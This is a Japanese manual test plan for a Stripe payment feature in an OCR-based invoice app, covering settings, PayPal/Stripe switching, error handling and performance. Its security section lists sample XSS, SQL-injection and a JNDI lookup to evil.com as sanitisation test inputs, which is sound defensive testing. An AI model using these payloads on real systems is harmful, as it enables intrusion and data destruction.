# Stripe機能 手動テスト手順書

## 📋 テスト概要

このドキュメントはStripe決済機能追加後の手動テスト手順を定義します。

### 🎯 テスト目的
- Stripe決済機能の動作確認
- PayPal/Stripe切り替え機能の検証
- UI/UXの操作性確認
- 日本語対応の確認
- エラーハンドリングの確認

## 🛠️ 事前準備

### 必要な環境設定

1. **Stripeアカウント準備**
   ```bash
   # テスト用APIキーを取得
   # https://dashboard.stripe.com/test/apikeys
   STRIPE_SECRET_KEY_TEST=sk_test_xxxx
   STRIPE_PUBLISHABLE_KEY_TEST=pk_test_xxxx
   ```

2. **環境変数設定**
   ```bash
   # .envファイルに以下を追加
   STRIPE_MODE=test
   DEFAULT_PAYMENT_PROVIDER=stripe
   ENCRYPT_API_KEYS=true
   ```

3. **テスト用PDFファイル準備**
   - 日本語請求書PDF
   - 英語請求書PDF
   - 金額・顧客名が記載された書類

### システム起動確認

```bash
# アプリケーション起動
python app.py

# 起動確認（ブラウザで確認）
http://localhost:5000
```

---

## 🧪 テストケース

### 1. 基本機能テスト

#### 1.1 Stripe設定画面テスト

**目的**: Stripe設定の基本操作確認

**手順**:
1. ブラウザで `/settings` にアクセス
2. Stripe設定セクションを確認
3. 以下の項目を入力:
   - Stripe環境モード: `テスト`
   - Stripe Publishable Key: `pk_test_xxxx`
   - Stripe Secret Key: `sk_test_xxxx`
4. 「Stripe接続テスト」ボタンをクリック
5. 「包括テスト」ボタンをクリック

**期待結果**:
- ✅ 設定項目が正しく表示される
- ✅ 接続テストが成功する
- ✅ 包括テストが成功する
- ✅ 成功メッセージが表示される

**確認項目**:
- [ ] UI要素が正しく表示されている
- [ ] 日本語ラベルが正しく表示されている
- [ ] バリデーションエラーが適切に表示される
- [ ] 成功/失敗のフィードバックが明確

---

#### 1.2 決済プロバイダー切り替えテスト

**目的**: PayPal/Stripe間の切り替え動作確認

**手順**:
1. 設定画面で「デフォルト決済プロバイダー」を確認
2. 以下のパターンをテスト:
   - PayPal → Stripe切り替え
   - Stripe → PayPal切り替え
3. 各設定で決済リンク作成をテスト

**期待結果**:
- ✅ プロバイダー切り替えが正常に動作
- ✅ 選択したプロバイダーで決済リンクが生成される
- ✅ UI表示が選択に応じて変更される

**確認項目**:
- [ ] プロバイダー選択UIが直感的
- [ ] 切り替え時の状態表示が正確
- [ ] エラー時の代替プロバイダー提案

---

### 2. PDF→OCR→決済リンク生成テスト

#### 2.1 正常系フローテスト

**目的**: 基本的なPDF処理フローの確認

**テストデータ**:
- 日本語請求書PDF（顧客名: 株式会社テスト、金額: ¥10,000）
- 英語請求書PDF（Customer: Test Corp, Amount: $100）

**手順**:
1. メイン画面でPDFファイルをアップロード
2. OCR処理の完了を待機
3. 抽出結果を確認
4. 決済プロバイダーで「Stripe」を選択
5. 「決済リンク作成」をクリック

**期待結果**:
- ✅ PDFが正常にアップロードされる
- ✅ OCR処理が完了する
- ✅ 日本語文字が正しく抽出される
- ✅ Stripe決済リンクが生成される
- ✅ リンクがアクセス可能

**確認項目**:
- [ ] ファイルアップロード UI/UX
- [ ] OCR処理のローディング表示
- [ ] 抽出結果の表示形式
- [ ] エラー時の適切なメッセージ表示

---

#### 2.2 日本語対応確認テスト

**目的**: 日本語文字の処理確認

**テストデータ**:
```
顧客名: 株式会社テスト商事
金額: ¥15,500
説明: サービス利用料（2024年1月分）
```

**手順**:
1. 日本語を含むPDFをアップロード
2. OCR結果で日本語が正しく表示されることを確認
3. Stripe決済リンクに日本語が正しく反映されることを確認
4. ブラウザで決済ページにアクセスし、文字化けがないことを確認

**期待結果**:
- ✅ 日本語文字が正しく抽出される
- ✅ 特殊文字（㈱、全角数字）も処理される
- ✅ 決済ページで日本語が正しく表示される

**確認項目**:
- [ ] 漢字・ひらがな・カタカナの表示
- [ ] 特殊文字（㈱、①②③）の処理
- [ ] 全角・半角数字の正規化
- [ ] 通貨記号（¥、円）の処理

---

### 3. エラーハンドリングテスト

#### 3.1 API エラーテスト

**目的**: Stripe API エラーの適切な処理確認

**手順**:
1. 設定画面で無効なStripe APIキーを入力
   ```
   Secret Key: sk_test_invalid_key
   ```
2. 接続テストを実行
3. エラーメッセージを確認
4. 決済リンク作成を試行
5. エラー時の動作を確認

**期待結果**:
- ✅ わかりやすいエラーメッセージが表示される
- ✅ 機密情報（APIキー）がエラーメッセージに含まれない
- ✅ 復旧手順が提示される

**確認項目**:
- [ ] エラーメッセージの分かりやすさ
- [ ] 技術的詳細の適切な隠蔽
- [ ] ユーザーアクションの明確な提示

---

#### 3.2 ネットワークエラーテスト

**目的**: ネットワーク障害時の動作確認

**手順**:
1. ネットワーク接続を一時的に無効化
2. 決済リンク作成を試行
3. タイムアウト動作を確認
4. ネットワーク復旧後の動作を確認

**期待結果**:
- ✅ タイムアウトエラーが適切に処理される
- ✅ リトライ機能が動作する（実装されている場合）
- ✅ ユーザーに分かりやすい説明が提供される

---

#### 3.3 入力値エラーテスト

**目的**: 不正な入力値の処理確認

**テストケース**:

| 項目 | 入力値 | 期待結果 |
|------|--------|----------|
| 金額 | -1000 | エラー：負の金額 |
| 金額 | 0 | エラー：ゼロ金額 |
| 金額 | abc | エラー：無効な形式 |
| 顧客名 | 空文字 | エラー：必須項目 |
| 顧客名 | 1000文字以上 | 適切な制限処理 |

**手順**:
1. 各テストケースの入力値でテスト実行
2. エラーメッセージの内容確認
3. システムのクラッシュがないことを確認

---

### 4. 境界値テスト

#### 4.1 金額境界値テスト

**目的**: 金額の最小/最大値処理確認

**テストケース**:
- 最小金額: ¥1
- 通常金額: ¥10,000
- 高額: ¥1,000,000
- 最大想定額: ¥99,999,999

**手順**:
1. 各金額でStripe決済リンクを作成
2. 作成されたリンクの金額表示を確認
3. 実際の決済ページで金額が正しく表示されることを確認

**期待結果**:
- ✅ 全ての金額で決済リンクが作成される
- ✅ 通貨変換が正しく行われる
- ✅ 桁区切り表示が正しい

---

#### 4.2 文字数制限テスト

**目的**: 入力項目の文字数制限確認

**テストケース**:
```
顧客名:
- 通常: 株式会社テスト (10文字)
- 長い名前: 株式会社とても長い名前の会社名前... (100文字)
- 非常に長い: A×1000文字

説明:
- 短い: テスト (4文字)  
- 長い: 詳細な説明文... (500文字)
- 非常に長い: B×2000文字
```

**手順**:
1. 各文字数パターンでテスト実行
2. 制限処理の動作確認
3. エラーメッセージの適切性確認

---

### 5. 統合テスト

#### 5.1 PayPal/Stripe併用テスト

**目的**: 両プロバイダーの併用動作確認

**手順**:
1. PayPal設定を有効化
2. Stripe設定を有効化
3. 同一PDFで両プロバイダーの決済リンクを作成
4. 両方のリンクが正常に動作することを確認

**期待結果**:
- ✅ 両プロバイダーの設定が共存
- ✅ プロバイダー選択が正常に動作
- ✅ 各決済リンクが独立して機能

---

#### 5.2 設定変更影響テスト

**目的**: 設定変更が既存機能に与える影響確認

**手順**:
1. PayPalで決済リンクを作成
2. デフォルトプロバイダーをStripeに変更
3. 新規決済リンク作成
4. 既存PayPalリンクが引き続き動作することを確認

**期待結果**:
- ✅ 設定変更が既存リンクに影響しない
- ✅ 新規作成は新しい設定を反映
- ✅ システムの一貫性が保たれる

---

### 6. パフォーマンステスト

#### 6.1 レスポンス時間測定

**目的**: 決済リンク作成の応答性確認

**測定項目**:
- PDFアップロード時間
- OCR処理時間  
- Stripe決済リンク作成時間
- 画面表示時間

**手順**:
1. 各処理のタイマー測定
2. 10回実行の平均値算出
3. 性能基準との比較

**性能基準**:
- PDFアップロード: 3秒以内
- OCR処理: 10秒以内
- 決済リンク作成: 2秒以内
- 画面表示: 1秒以内

---

#### 6.2 大量ファイル処理テスト

**目的**: 連続処理時の性能確認

**手順**:
1. 10個のPDFファイルを連続処理
2. メモリ使用量の監視
3. エラー発生率の確認
4. 最終処理時間の測定

**期待結果**:
- ✅ メモリリークが発生しない
- ✅ エラー率が5%以下
- ✅ 処理時間の著しい増加がない

---

### 7. セキュリティテスト

#### 7.1 APIキー保護確認

**目的**: APIキーの適切な保護確認

**確認項目**:
- [ ] APIキーが暗号化されて保存される
- [ ] ログにAPIキーが記録されない
- [ ] エラーメッセージにAPIキーが含まれない
- [ ] ブラウザコンソールにAPIキーが表示されない

**手順**:
1. Stripe APIキーを設定
2. ブラウザの開発者ツールでネットワークタブを確認
3. アプリケーションログを確認
4. エクスポート機能でAPIキーが除外されることを確認

---

#### 7.2 入力サニタイゼーション確認

**目的**: XSS攻撃などの防止確認

**テスト入力**:
```
顧客名: <script>alert('XSS')</script>
説明: '; DROP TABLE users; --
金額: ${jndi:ldap://evil.com/a}
```

**手順**:
1. 危険な入力値でテスト実行
2. 画面表示でスクリプト実行されないことを確認
3. データベースに影響がないことを確認

**期待結果**:
- ✅ HTMLタグがエスケープされる
- ✅ SQLインジェクションが防止される
- ✅ システムが安定して動作する

---

## 📊 テスト結果記録シート

### 基本情報
- **テスト実施日**: ___________
- **テスト実施者**: ___________
- **システムバージョン**: ___________
- **環境**: [ ] 開発 [ ] ステージング [ ] 本番

### テスト結果サマリー

| カテゴリー | 実施数 | 成功 | 失敗 | スキップ | 合格率 |
|------------|--------|------|------|----------|--------|
| 基本機能 | ___ | ___ | ___ | ___ | __% |
| PDF→OCR→決済 | ___ | ___ | ___ | ___ | __% |
| エラーハンドリング | ___ | ___ | ___ | ___ | __% |
| 境界値 | ___ | ___ | ___ | ___ | __% |
| 統合テスト | ___ | ___ | ___ | ___ | __% |
| パフォーマンス | ___ | ___ | ___ | ___ | __% |
| セキュリティ | ___ | ___ | ___ | ___ | __% |
| **総計** | ___ | ___ | ___ | ___ | __% |

### 不具合・課題一覧

| ID | カテゴリー | 概要 | 重要度 | ステータス | 担当者 |
|----|------------|------|--------|------------|--------|
| B001 |  |  | [ ]高 [ ]中 [ ]低 |  |  |
| B002 |  |  | [ ]高 [ ]中 [ ]低 |  |  |
| B003 |  |  | [ ]高 [ ]中 [ ]低 |  |  |

### 改善提案

| 項目 | 現状 | 提案内容 | 期待効果 |
|------|------|----------|----------|
|  |  |  |  |
|  |  |  |  |

### 総合評価

**リリース判定**: [ ] 可 [ ] 条件付き可 [ ] 不可

**判定理由**:
___________________________________________

**次回テスト予定**:
___________________________________________

---

## 🔧 トラブルシューティング

### よくある問題と解決方法

#### Stripe接続エラー
**症状**: "Stripe API接続エラー"
**原因**: APIキーの形式不正、ネットワーク問題
**解決方法**:
1. APIキーの形式確認（sk_test_、pk_test_で始まる）
2. ネットワーク接続確認
3. Stripeダッシュボードでキーの有効性確認

#### OCR処理失敗
**症状**: "OCRデータの抽出に失敗"
**原因**: PDF形式の問題、画質不良
**解決方法**:
1. PDFファイルの再作成
2. 画像解像度の向上
3. OCR方式の変更（Tesseract → Google Vision）

#### 日本語文字化け
**症状**: 決済ページで日本語が正しく表示されない
**原因**: 文字エンコーディング問題
**解決方法**:
1. ブラウザの文字エンコーディング確認
2. サーバーのロケール設定確認
3. データベースの文字セット確認

### ログの確認方法

```bash
# アプリケーションログ
tail -f logs/app.log

# Stripeエラーログ
grep "stripe" logs/app.log | tail -20

# エラーログ
grep "ERROR" logs/app.log | tail -10
```

### デバッグモード起動

```bash
# デバッグモードでアプリケーション起動
export FLASK_ENV=development
export DEBUG=True
python app.py
```